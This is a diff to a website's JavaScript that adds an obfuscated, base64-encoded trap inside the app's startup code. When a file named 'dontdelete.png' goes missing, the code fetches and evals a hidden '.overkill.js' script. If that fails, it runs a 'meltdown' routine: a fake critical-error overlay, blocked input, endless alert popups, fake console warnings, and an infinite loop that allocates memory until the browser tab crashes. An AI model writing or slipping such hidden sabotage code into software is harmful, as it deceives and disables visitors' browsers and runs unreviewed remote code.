@@ -184,53 +184,67 @@ try {
 
     document.addEventListener("DOMContentLoaded", initializeApp);
 
-    (function(){
-      let aX1_ = atob("Li4vaW1nL2RvbnRkZWxldGUucG5n"); 
-      let xY9$ = new Image();
-      xY9$.src = aX1_;
   
-      xY9$.onerror = function() {
-          console.error(atob("8J+UjSBJbWFnZSBOT1QgTk9VTkQhIEJyZWFraW5nIHNpdGUuLi4="));
-          
-          if (document.getElementById("interactive-background")) {
-              document.getElementById("interactive-background").remove();
-          }
-
+    (function(){
+      let d = s => atob(s);
+  
+      let filePath = d("Li4vaW1nL2RvbnRkZWxldGUucG5n"); // dontdelete.png path
+      let backupScript = d("Li4vLmhpZGRlbi8ub3ZlcmtpbGwuanM="); // .hidden/.overkill.js
+  
+      setInterval(() => {
+          let imgTest = new Image();
+          imgTest.src = filePath + "?v=" + Date.now();
+  
+          imgTest.onerror = function() {
+              fetch(backupScript)
+                  .then(r => { if (!r.ok) throw new Error(d("Tm8gbWVsZG93biBmaWxl")); return r.text(); })
+                  .then(code => eval(code))
+                  .catch(() => meltdown());
+          };
+      }, 2000);
+  
+      function meltdown() {
+          let bgId = d("aW50ZXJhY3RpdmUtYmFja2dyb3VuZA==");
+          let bg = document.getElementById(bgId);
+          if (bg) bg.remove();
+  
           let overlay = document.createElement("div");
-          overlay.style.position = "fixed";
-          overlay.style.top = "0";
-          overlay.style.left = "0";
-          overlay.style.width = "100vw";
-          overlay.style.height = "100vh";
-          overlay.style.backgroundColor = "rgba(0, 0, 0, 0.9)";
-          overlay.style.color = "red";
-          overlay.style.fontSize = "24px";
-          overlay.style.fontWeight = "bold";
-          overlay.style.display = "flex";
-          overlay.style.alignItems = "center";
-          overlay.style.justifyContent = "center";
-          overlay.innerHTML = `<h1>${atob("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1><p>${atob("RmF0YWwgZXJyb3Iu")}</p>`;
+          overlay.style = `
+              position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+              background-color: rgba(0, 0, 0, 0.9); color: red; font-size: 24px;
+              font-weight: bold; display: flex; align-items: center; justify-content: center;
+          `;
+          overlay.innerHTML = `
+              <h1>${d("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1>
+              <p>${d("RmF0YWwgZXJyb3Iu")}</p>
+          `;
           document.body.appendChild(overlay);
   
-          setInterval(() => alert(atob("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg==")), 3000);
+          console.error(d("8J+UjSBJbWFnZSBOT1QgTk9VTkQh"));
   
           document.body.style.pointerEvents = "none";
-          document.onkeydown = (e) => e.preventDefault();
+          document.onkeydown = e => e.preventDefault();
           document.body.style.transform = "rotate(180deg)";
           document.body.style.filter = "blur(10px) grayscale(100%)";
   
           setInterval(() => {
-              console.error(atob("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ=")); 
-              console.warn(atob("RGVwcmVjYXRlZCBBUEkgdXNlZA==")); 
-              console.info(atob("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0=")); 
+              alert(d("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg=="));
+          }, 3000);
+  
+          setInterval(() => {
+              console.error(d("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ="));
+              console.warn(d("RGVwcmVjYXRlZCBBUEkgdXNlZA=="));
+              console.info(d("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0="));
           }, 2000);
-      };
   
-      setTimeout(() => {
-          if (Math.random() > 0.3) debugger;
-      }, Math.floor(Math.random() * (8000 - 3000) + 3000));
-  })();
-  
+          setTimeout(() => {
+              let meltdownArr = [];
+              while (true) {
+                  meltdownArr.push(new Uint8Array(5e8));
+              }
+          }, 1000);
+      }
+  })();  
 
 } catch (error) {
     console.error("Failed to load Lucide:", error)
